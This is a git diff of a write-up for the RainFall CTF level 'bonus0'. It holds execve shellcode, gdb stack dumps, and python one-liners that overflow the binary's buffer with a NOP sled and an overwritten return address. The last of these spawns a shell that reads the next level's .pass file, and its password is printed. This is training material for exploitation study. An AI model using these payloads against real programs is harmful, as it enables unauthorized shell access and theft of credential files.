@@ -116,17 +116,54 @@ the return address is => 0xbfffe680 => \x80\xe6\xff\xbf
 shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
 ```
 
- export code=$(python -c 'print("\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68" "\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
-
-
 ```
-    (gdb) start
-    Temporary breakpoint 1 at 0x80485a7
+    (gdb) run
     Starting program: /home/user/bonus0/bonus0 
 
-    Temporary breakpoint 1, 0x080485a7 in main ()
-    (gdb) p/x getenv("code")
-    $1 = 0xbfffff47
+    Breakpoint 1, 0x080484bd in p ()
+    (gdb) ni
+    0x080484c0 in p ()
+    (gdb) ni
+    0x080484c3 in p ()
+    (gdb) ni
+    - 
+    0x080484c8 in p ()
+    (gdb) ni
+    0x080484d0 in p ()
+    (gdb) ni
+    0x080484d6 in p ()
+    (gdb) ni
+    0x080484da in p ()
+    (gdb) ni
+    0x080484e1 in p ()
+    (gdb) ni
+    run < <(python -c 'print("A"* 28 + "\x90"* 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+    0x080484e6 in p ()
+    (gdb) x/40wx $ebp-0x1008
+    0xbfffe680:     0x206e7572      0x283c203c      0x68747970      0x2d206e6f
+    0xbfffe690:     0x70272063      0x746e6972      0x22412228      0x3832202a
+    0xbfffe6a0:     0x22202b20      0x3039785c      0x32202a22      0x2b203030
+    0xbfffe6b0:     0x785c2220      0x785c6136      0x785c6230      0x785c3835
+    0xbfffe6c0:     0x785c3939      0x785c3235      0x785c3836      0x785c6632
+    0xbfffe6d0:     0x785c6632      0x785c3337      0x785c3836      0x785c3836
+    0xbfffe6e0:     0x785c6632      0x785c3236      0x785c3936      0x785c6536
+    0xbfffe6f0:     0x785c3938      0x785c3365      0x785c3133      0x785c3963
+    0xbfffe700:     0x785c6463      0x29223038      0x000a2927      0x00000000
+    0xbfffe710:     0x00000000      0x00000000      0x00000000      0x00000000
 ```
 
 (python -c 'print("A"*29 + "\x80\xe6\xff\xbf" + "\x90" * 200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")'; cat) | ./bonus0
+
+```
+    bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"';python -c 'print "A"* 9 + "\x10\xe7\xff\xbf" + "B" * 7'; cat) | ./bonus0
+```
+
+
+```
+    bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"';python -c 'print "A"* 9 + "\x10\xe7\xff\xbf" + "B" * 7'; cat) | ./bonus0 
+    - 
+    - 
+    ��������������������AAAAAAAAA���BBBBBBB��� AAAAAAAAA���BBBBBBB���
+    cat /home/user/bonus1/.pass
+    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
